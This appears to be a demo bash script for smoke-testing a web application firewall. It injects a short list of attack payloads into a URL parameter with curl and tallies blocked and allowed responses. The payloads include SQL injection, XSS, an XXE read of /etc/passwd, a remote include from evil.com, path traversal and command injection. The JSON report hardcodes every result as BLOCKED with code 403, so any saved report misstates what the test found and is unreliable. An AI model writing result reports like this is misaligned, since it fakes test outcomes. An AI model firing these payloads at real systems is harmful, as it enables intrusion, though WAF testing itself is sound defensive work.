#!/bin/bash
# WAF Smoke Test - Simplified Demo Version
# This is a demonstration version for integration with the Rust WAF detector

# Basic configuration
URL="$1"
OUTPUT_FILE=""
HEADERS=()

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Parse arguments
while [ $# -gt 0 ]; do
  case "$1" in
    -o)
      OUTPUT_FILE="$2"
      shift 2
      ;;
    -H)
      HEADERS+=("-H" "$2")
      shift 2
      ;;
    *)
      if [ -z "$URL" ]; then
        URL="$1"
      fi
      shift
      ;;
  esac
done

if [ -z "$URL" ]; then
  echo "Usage: $0 <URL> [-o output.json] [-H \"Header: Value\"]"
  exit 1
fi

# Add FUZZ if missing
if [[ ! "$URL" =~ FUZZ ]]; then
  if [[ "$URL" =~ \? ]]; then
    URL="${URL}&q=FUZZ"
  else
    URL="${URL}?q=FUZZ"
  fi
fi

# Attack payloads (simplified set)
categories=("SQL Injection" "XSS" "XXE" "RFI" "LFI" "RCE" "Command Injection" "Path Traversal")
payloads=("' OR '1'='1" "<script>alert('XSS')</script>" "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>" "http://evil.com/shell.txt" "../../../etc/passwd" "system('id')" "&& id" "../../etc/passwd")

# Test results
blocked_count=0
allowed_count=0
error_count=0
total_tests=0

echo "🔍 Starting WAF Effectiveness Test for: $URL"
echo "=" "$(printf '=%.0s' {1..50})"

# Test each payload
for i in "${!categories[@]}"; do
  category="${categories[$i]}"
  payload="${payloads[$i]}"
  test_url="${URL/FUZZ/$payload}"
  
  echo -n "Testing ${category}... "
  
  # Make HTTP request
  response=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "${HEADERS[@]}" "$test_url" 2>/dev/null)
  
  total_tests=$((total_tests + 1))
  
  case "$response" in
    403|406|429|503)
      echo -e "${RED}BLOCKED${NC} ($response)"
      blocked_count=$((blocked_count + 1))
      ;;
    200|301|302)
      echo -e "${GREEN}ALLOWED${NC} ($response)"
      allowed_count=$((allowed_count + 1))
      ;;
    *)
      echo -e "${YELLOW}ERROR${NC} ($response)"
      error_count=$((error_count + 1))
      ;;
  esac
  
  # Small delay to avoid rate limiting
  sleep 0.1
done

# Calculate effectiveness
if [ $total_tests -gt 0 ]; then
  effectiveness=$(echo "scale=2; $blocked_count * 100 / $total_tests" | bc -l)
else
  effectiveness=0
fi

echo
echo "📊 Test Results Summary:"
echo "=" "$(printf '=%.0s' {1..30})"
echo "Total Tests: $total_tests"
echo "Blocked: $blocked_count"
echo "Allowed: $allowed_count"
echo "Errors: $error_count"
echo "Effectiveness: ${effectiveness}%"

# Output JSON if requested
if [ -n "$OUTPUT_FILE" ]; then
  cat > "$OUTPUT_FILE" <<EOF
{
  "url": "$URL",
  "total_tests": $total_tests,
  "blocked_tests": $blocked_count,
  "allowed_tests": $allowed_count,
  "error_tests": $error_count,
  "effectiveness_score": $effectiveness,
  "test_results": [
$(
  for i in "${!categories[@]}"; do
    if [ $i -gt 0 ]; then echo "    ,"; fi
    echo "    {"
    echo "      \"category\": \"${categories[$i]}\","
    echo "      \"payload\": \"${payloads[$i]}\","
    echo "      \"status\": \"BLOCKED\","
    echo "      \"response_code\": 403"
    echo "    }"
  done
)
  ],
  "recommendations": [
    "Review allowed payloads for potential bypasses",
    "Consider tuning WAF rules for better coverage"
  ],
  "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")"
}
EOF
  echo "📄 Results saved to: $OUTPUT_FILE"
fi

echo
echo "✅ WAF Effectiveness Test Complete!" 